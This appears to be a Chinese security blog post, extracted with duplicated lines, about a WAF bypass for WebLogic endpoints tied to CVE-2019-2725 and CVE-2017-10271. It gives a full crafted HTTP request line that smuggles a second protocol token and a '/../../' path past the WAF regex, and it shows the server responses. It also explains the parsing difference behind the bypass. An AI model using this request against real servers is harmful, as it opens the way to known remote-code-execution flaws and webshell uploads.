Bypass WAF ⼀些姿势（⼀）
前⾔
WAF 除了对 post 的 payload 进⾏检测，此外还有个功能是对访问的 URL 路径进⾏限制，例如⼀些敏感路径，
Weblogic  CVE-2019-2725  的 /_async/AsyncResponseService
/_async/AsyncResponseService  、CVE-2017-10271 的 /wls-
/wls-
wsat/CoordinatorPortType*
wsat/CoordinatorPortType*  等，这样可以缓解⼀些 weblogic 版本⽆法升级或打补丁的窘境。但是在最近⼀
次监控告警中，发现某品牌 WAF 被绕过，成功上传 webshell 。
访问控制绕过
WAF 规则限制访问 /_async/*
/_async/*  , 直接访问 http://x.x.x.x/_async/AsyncResponseService ， ⻚⾯⽆响应。但是如果
对 HTTP 头进⾏改造。
注意 http 请求⾏中，在原本协议版本 HTTP 1.1
HTTP 1.1   后，⼜添加了 /../../_async/AsyncResponseService
/../../_async/AsyncResponseService  
HTTP/1.1
HTTP/1.1 ，对该报⽂进⾏重放时发现，原本⽆法访问的敏感⽬录⼜可以重新被访问了。
GET
GET  //  HTTP/1.1 /../../_async/AsyncResponseService HTTP/1.1
HTTP/1.1 /../../_async/AsyncResponseService HTTP/1.1
Host:
Host: 127.0.0.1
 127.0.0.1
Upgrade-Insecure-Requests:
Upgrade-Insecure-Requests: 1
 1
User-Agent:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,  
like Gecko) Chrome/91.0.4472.124 Safari/537.36
like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept:
Accept:  
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/a
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/a
png,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
png,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding:
Accept-Encoding: gzip, deflate
 gzip, deflate
Accept-Language:
Accept-Language: zh-CN,zh;q=0.9
 zh-CN,zh;q=0.9
Connection:
Connection: close
 close
绕过原理
直到写⽂章之前，我也没意识到为什么可以绕过 WAF 的访问限制，同时 weblogic 还可以正常解析。但是对⽐正常
的响应报⽂和绕过 WAF 的响应报⽂，突然发现，weblogic 在解析请求⾏对于 URL 部分的匹配条件更宽松⼀些。如
下是响应包对⽐：
通过对⽐可以看出，weblogic 在定位请求⾏的 URL 部分选取了第⼀个请求⽅法与最后⼀个协议版本中间部分的内
容，⽽中间的内容即使有空格也被转译成 ++  号。因此重新审视 bypass WAF 的请求⾏，weblogic 会认为 URL 为 
http://x.x.x.x/%20HTTP/1.1%20/../../_async/AsyncResponseService
http://x.x.x.x/%20HTTP/1.1%20/../../_async/AsyncResponseService  ，同时两层 ../../
../../  穿越
到根⽬录，最终访问到敏感路径 /_async/AsyncResponseService
/_async/AsyncResponseService 。
bypass WAF response
bypass WAF response：
：
>
  >
    >Welcome to the
Welcome to the  
{http://www.bea.com/async/AsyncResponseService}AsyncResponseService home page
{http://www.bea.com/async/AsyncResponseService}AsyncResponseService home page
      >
        >Test page
Test page
        >
      >
      >
        >WSDL page
WSDL page
        >
      >
    >
>
normal response
normal response：
：
>
  >
    >Welcome to the
Welcome to the  
{http://www.bea.com/async/AsyncResponseService}AsyncResponseService home page
{http://www.bea.com/async/AsyncResponseService}AsyncResponseService home page
      >
        >Test page
Test page
        >
      >
      >
        >WSDL page
WSDL page
        >
      >
   >
>
解释了为什么 weblogic 可以正常解析，对于绕过 WAF 就相对好理解了，⼀般的 WAF 规则都是正则表达式，所以对
于 URL 的路径选择应该只选择第⼀个请求⽅法到第⼀个协议版本之间的部分，因此只选择了 //  部分，⽽根⽬录不
是敏感⽬录，因此绕过了 WAF 限制。
总结
Bypass WAF 的访问控制就是在绕过 WAF 的正则规则，同时后端应⽤可以正常解析。